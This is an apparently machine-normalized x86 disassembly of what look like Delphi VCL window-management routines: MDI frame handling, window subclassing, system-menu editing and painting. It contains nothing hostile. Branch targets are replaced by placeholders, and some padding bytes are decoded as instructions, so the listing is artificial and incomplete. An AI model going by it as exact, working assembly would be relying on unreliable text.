or [ esi + 0x4 ] 0xcf0000
jmp r-xdata
xor eax eax
mov al [ esp ]
cmp eax 0x5
ja r-xdata
mov al [ esp ]
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
jmp [ eax * 4 + jump_table_469f43 ]
mov [ esp ] 0x2
sub al 0x3
jne r-xdata
mov al [ esp ]
sub al 0x3
jae r-xdata
mov [ esi + 0x8 ] 0x80
lea edx [ esi + 0x8 ]
mov eax edi
call sub_452e78
mov al [ r-xdata ]
and al bl
mov ebx eax
cmp [ edi + 0x30 ] 0x0
jne r-xdata
or [ esi + 0x4 ] 0xc00000
jmp r-xdata
or [ esi + 0x4 ] 0xc40000
mov al [ edi + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ esi + 0x4 ]
or eax 0x80000000
or eax 0xc00000
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x101
lea edx [ esi + 0x8 ]
mov eax edi
call sub_452e78
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ edi + 0x22b ] 0x0
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov bl [ r-xdata ]
jmp r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov [ esi + 0x14 ] 0x80000000
mov [ esi + 0x18 ] 0x80000000
jmp r-xdata
sub al 0x2
jne r-xdata
mov al [ r-xdata ]
and al bl
mov ebx eax
mov [ esi + 0x24 ] 0x2808
mov eax [ esi + 0x4 ]
or eax __dos_header
or eax 0x80
mov [ esi + 0x4 ] eax
test bl 0x8
je r-xdata
or [ esi + 0x4 ] 0x80000
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x80000000
test [ edi + 0x1d ] 0x2
je r-xdata
or [ esi + 0x8 ] 0x400
test bl 0x4
je r-xdata
or [ esi + 0x4 ] 0x20000
mov al [ edi + 0x22b ]
cmp al 0x1
jne r-xdata
cmp [ edi + 0x22f ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff3fffff
or [ esi + 0x4 ] 0x10000
cmp al 0x2
jne r-xdata
or [ esi + 0x4 ] 0x20000000
jmp r-xdata
mov eax DefMDIChildProcA
mov [ esi + 0x28 ] eax
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x1000000
jmp r-xdata
sub_46a0a5
add [ eax ] al
add [ ecx ] cl
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_467458
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al [ ebx + 0x22f ]
sub al 0x2
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_456054
push eax
call SendMessageA
mov eax ebx
call sub_46aa04
push eax
push 0x1
push 0x80
mov eax ebx
call sub_456054
push eax
call SendMessageA
jmp r-xdata
mov [ esp + 0x4 ] 0xff00
xor eax eax
mov [ esp ] eax
mov esi [ ebx + 0x258 ]
test esi esi
je r-xdata
dec al
je r-xdata
push 0x56330001
push 0x0
push 0x0
mov eax ebx
call sub_44f258
push eax
mov eax ebx
call sub_44f29c
push eax
mov eax ebx
call sub_456054
push eax
push 0x0
mov eax [ rw-data ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov edx r-xdata
xor ecx ecx
mov eax 0x200
call sub_406d20
mov [ ebx + 0x254 ] eax
push ebx
push sub_468ff0
call sub_422400
mov [ ebx + 0x278 ] eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call GetWindowLongA
mov [ ebx + 0x274 ] eax
mov eax [ ebx + 0x278 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax esi
call sub_45fd34
mov [ esp ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov eax ebx
call sub_456054
push eax
call SetWindowPos
jmp r-xdata
sub_46a1f2
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff4c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xb4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_46a31d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov esi edx
lea edi [ ebp - 0xb0 ]
mov ecx 0x23
[ edi ] [ esi ]
and [ ebp - 0xa8 ] 0xfff7ffff
lea edx [ ebp - 0xb0 ]
mov eax ebx
call sub_4531dc
and [ ebx + 0x2f4 ] 0xef
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0xb4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
cmp [ eax + 0x254 ] 0x0
jne r-xdata
mov eax ebx
call sub_46c710
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a324
lea eax [ edx + 0x4c ]
mov [ ebp - 0x24 ] eax
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x0
push 0x220
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
mov [ ebx + 0x180 ] eax
or [ ebx + 0x2f4 ] 0x10
jmp r-xdata
sub_46a32c
push ebx
mov ebx eax
test [ ebx + 0x2f4 ] 0x10
je r-xdata
mov eax ebx
call sub_453448
push 0x0
mov eax ebx
call sub_456054
push eax
push 0x221
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
xor eax eax
mov [ ebx + 0x254 ] eax
pop ebx
retn
sub_46a370
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x254 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_453bcc
cmp [ esi ] 0x5
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebx + 0x254 ]
push eax
mov eax ebx
call sub_456054
push eax
call DefFrameProcA
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_456054
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop esi
pop ebx
retn
sub_46a3d4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_46a47c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi [ ebx + 0x220 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a483
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
test edi edi
je r-xdata
mov [ ebx + 0x220 ] edi
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp ebx edi
je r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
mov eax edi
call sub_466768
cmp ebx eax
jne r-xdata
mov eax ebx
mov si 0xffb2
call sub_4034ac
mov eax ebx
call sub_46a78c
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax edi
mov si 0xffb8
call sub_4034ac
test al al
jne r-xdata
sub_46a48c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test bl bl
je r-xdata
mov edx [ edi + 0x220 ]
mov eax esi
call sub_452b30
test al al
je r-xdata
mov edx [ edi + 0x224 ]
mov eax esi
call sub_452b30
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax edi
call sub_46a3d4
mov eax [ esi + 0x30 ]
mov [ edi + 0x224 ] eax
sub_46a4d4
push ebx
push esi
mov esi eax
mov bl [ esi + 0x22e ]
mov eax esi
call sub_46a3d4
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_46a4f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor ebx ebx
inc [ rw-data ]
cmp [ edi + 0x250 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x64 ] edx
mov eax [ rw-data ]
mov [ eax + 0x68 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov edx edi
call sub_418b4c
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov ecx edi
xor edx edx
call sub_418a2c
mov eax edi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
cmp edi [ ebp - 0x4 ]
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
mov [ eax + 0x6c ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov edx edi
call sub_418b4c
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov ecx edi
xor edx edx
call sub_418a2c
jmp r-xdata
xor eax eax
mov [ edi + 0x220 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x220 ] eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x54 ]
or ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] ax
xor edx edx
push ebp
push sub_46a768
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
cmp edi eax
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
cmp [ edi + 0x224 ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ edi + 0x224 ] edi
mov eax [ rw-data ]
mov [ eax + 0x78 ] edi
mov eax edi
call sub_456054
mov dx 0xb000
call sub_466514
test al al
jne r-xdata
call sub_456054
mov esi eax
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov dx 0xb001
mov eax esi
call sub_466514
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a76f
mov eax [ ebp - 0x4 ]
mov dx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
retn
jmp r-xdata
call sub_403b10
jmp r-xdata
call sub_403b10
jmp r-xdata
mov esi [ edi + 0x224 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_452b30
test al al
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
call sub_456054
mov esi eax
mov eax [ edi + 0x224 ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x224 ] eax
mov dx 0xb01b
mov eax esi
call sub_466514
test al al
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
cmp eax [ edi + 0x224 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax edi
call sub_450a20
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
call sub_403b10
jmp r-xdata
mov esi eax
mov [ edi + 0x224 ] esi
mov eax esi
call sub_456054
mov dx 0xb01a
call sub_466514
test al al
jne r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov esi [ esi + 0x30 ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
call sub_403b10
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_450a20
sub_46a78c
push ebx
push esi
mov edx [ eax + 0x220 ]
test edx edx
je r-xdata
mov ebx eax
cmp [ eax + 0x250 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb029
mov eax ebx
call sub_450a20
mov ebx edx
jmp r-xdata
mov eax ebx
call sub_456054
push eax
call SetFocus
mov eax ebx
call sub_456054
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
sub_46a7dc
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0x22e ] bl
mov eax [ esi + 0x27c ]
test eax eax
je r-xdata
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb02b
call sub_450a20
pop esi
pop ebx
retn
cmp [ esi + 0x220 ] 0x0
jne r-xdata
mov dl 0x1
mov eax esi
call sub_46a890
mov eax esi
call sub_46a78c
test [ esi + 0x1c ] 0x10
jne r-xdata
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax esi
call sub_45647c
mov edx eax
mov eax esi
call sub_46a3d4
sub_46a840
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x22e ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_469458
test eax eax
je r-xdata
push esi
xor ecx ecx
mov edx 0xb004
mov eax [ ebx + 0x220 ]
call sub_450a20
mov eax ebx
call sub_469458
mov edx esi
call sub_46a840
sub_46a890
push esi
test [ eax + 0x2f4 ] 0x8
jne r-xdata
pop esi
retn
mov ecx [ rw-data ]
cmp [ ecx + 0x44 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x248 ] 0x0
je r-xdata
mov ecx [ rw-data ]
cmp eax [ ecx + 0x44 ]
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
xor esi esi
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x22f ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x248 ]
test dl dl
je r-xdata
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx esi
call sub_463860
mov edx esi
call sub_463844
jmp r-xdata
mov ecx [ eax + 0x248 ]
cmp [ ecx + 0x5c ] 0x0
jne r-xdata
mov esi [ eax + 0x248 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_46a938
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebx edx
mov ebp eax
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
cmp edi ebx
je r-xdata
mov ebx esi
push 0x0
push 0x0
push ebp
mov eax ebx
call sub_456054
push eax
call SendMessageA
sub_46a984
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb000
call sub_46a938
cmp [ ebx + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_46a9b4
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb001
call sub_46a938
cmp [ ebx + 0x2a2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
sub_46aa20
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_4252d4
xor eax eax
push ebp
push sub_46aace
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov edx ebx
call sub_4256c8
xor eax eax
push ebp
push sub_46aaab
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_4034ac
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0x28 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46aab2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
xor edx edx
call sub_4256c8
retn
sub_46aadc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] dl
mov [ esp ] eax
xor ebx ebx
mov eax [ esp ]
call sub_469458
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp ]
call sub_46948c
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
mov dl [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov si 0xffd1
call sub_4034ac
mov ebx eax
test [ esp + 0x4 ] bl
jne r-xdata
inc ebp
mov [ esp + 0x8 ] 0x0
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov dl [ esp + 0x4 ]
mov eax [ esp ]
call sub_45531c
mov ebx eax
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_4694d8
mov edi eax
cmp edi [ esp + 0xc ]
je r-xdata
inc [ esp + 0x8 ]
dec ebp
jne r-xdata
mov dl [ esp + 0x4 ]
mov eax edi
mov si 0xffd1
call sub_4034ac
or bl al
test [ esp + 0x4 ] bl
jne r-xdata
sub_46ab7c
push ebx
push esi
add esp 0xffffffc0
mov esi edx
mov ebx eax
mov eax ebx
call sub_456054
push eax
call IsIconic
test eax eax
jne r-xdata
push esp
mov eax ebx
call sub_456054
push eax
call BeginPaint
mov esi eax
mov eax ebx
call sub_46aa04
push eax
push 0x0
push 0x0
push esi
call DrawIcon
push esp
mov eax ebx
call sub_456054
push eax
call EndPaint
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
call sub_4541e4
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
jmp r-xdata
add esp 0x40
pop esi
pop ebx
retn
sub_46abfa
add [ eax ] al
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x170 ]
call sub_424bf4
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
jmp r-xdata
sub_46ac5c
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_456054
push eax
call IsIconic
test eax eax
jne r-xdata
mov [ edi ] 0x27
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
retn
mov edx edi
mov eax esi
call sub_4544a8
pop edi
pop esi
retn
sub_46aca8
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_456054
push eax
call GetSystemMenu
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x2
jne r-xdata
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x400
push 0x7
push ebx
call DeleteMenu
push 0x400
push 0x5
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x4
jne r-xdata
push 0x1
push 0xf020
push ebx
call EnableMenuItem
push 0x1
push 0xf030
push ebx
call EnableMenuItem
sub_46ada4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
call sub_4697cc
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_46aca8
pop ecx
sub_46add8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_450f3c
cmp [ ebx + 0x9b ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_456054
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_456054
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_456054
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov edx eax
xor dl 0x1
or ecx 0xffffffff
mov eax ebx
call sub_44ff14
pop esi
pop ebx
retn
sub_46ae68
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x248 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_456054
push eax
call SendMessageA
mov edx esi
mov eax ebx
call sub_4552a8
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax ebx
call sub_456054
push eax
call SetMenu
xor edx edx
mov eax [ ebx + 0x248 ]
call sub_463280
sub_46aec8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_454344
cmp [ ebx + 0x248 ] 0x0
je r-xdata
mov dx [ esi + 0x4 ]
mov eax [ ebx + 0x248 ]
call sub_462c94
test al al
jne r-xdata
pop esi
pop ebx
retn
sub_46af14
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
call sub_4634f4
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_46af4c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_46afe7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x248 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46afee
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
xor esi esi
cmp [ edx + 0x6 ] 0xffff
jne r-xdata
xor ebx ebx
movzx eax [ edx + 0x4 ]
test [ edx + 0x6 ] 0x10
je r-xdata
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov ecx ebx
mov edx eax
mov eax [ edi + 0x248 ]
call sub_462bf4
mov esi eax
mov bl 0x1
push eax
mov eax [ edx + 0x8 ]
push eax
call GetSubMenu
test esi esi
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46fd08
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_44c9b8
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46fd08
jmp r-xdata
sub_46b014
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
je r-xdata
mov [ ebx + 0x22b ] dl
cmp [ ebx + 0x264 ] 0x0
je r-xdata
mov eax ebx
mov si 0xffd0
call sub_4034ac
pop esi
pop ebx
retn
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0x10 ]
sub_46b054
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
call sub_40d0b4
test al al
jne r-xdata
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov al 0x1
sub_46b080
push ebx
push esi
mov ebx edx
xor edx edx
mov [ ebx + 0xc ] edx
test [ eax + 0x1c ] 0x10
jne r-xdata
mov esi [ ebx + 0x8 ]
xor edx edx
call sub_46a840
movzx ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax 0xb017
call sub_44c790
test eax eax
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xc ] 0x1
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx [ eax + 0x248 ]
cmp [ edx + 0x5c ] 0x0
je r-xdata
sub_46b0d8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf010
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_45518c
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_46e6bc
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp eax 0xf120
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x5b ] 0x0
je r-xdata
cmp [ ebx + 0x22b ] 0x1
jne r-xdata
mov eax ebx
mov si 0xffd0
call sub_4034ac
sub_46b164
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
dec eax
je r-xdata
mov eax ebx
call sub_456054
push eax
call IsIconic
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax ebx
call sub_456054
push eax
call IsZoomed
test eax eax
je r-xdata
mov [ ebx + 0x22c ] 0x2
jmp r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
jmp r-xdata
mov [ ebx + 0x22c ] 0x1
mov [ ebx + 0x22c ] 0x3
jmp r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
pop esi
pop ebx
retn
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax ebx
call sub_456054
push eax
call ShowWindow
mov [ ebx + 0x22c ] 0x0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_46b1fc
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_456054
cmp eax [ ebx + 0x8 ]
sete al
mov ebx eax
mov edx ebx
mov eax esi
call sub_46a7dc
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test [ eax + 0x54 ] 0x4
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov dl 0x1
mov si 0xffd1
call sub_4034ac
sub_46b254
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0x1
mov ecx [ edx + 0x4 ]
cmp ecx 0x1
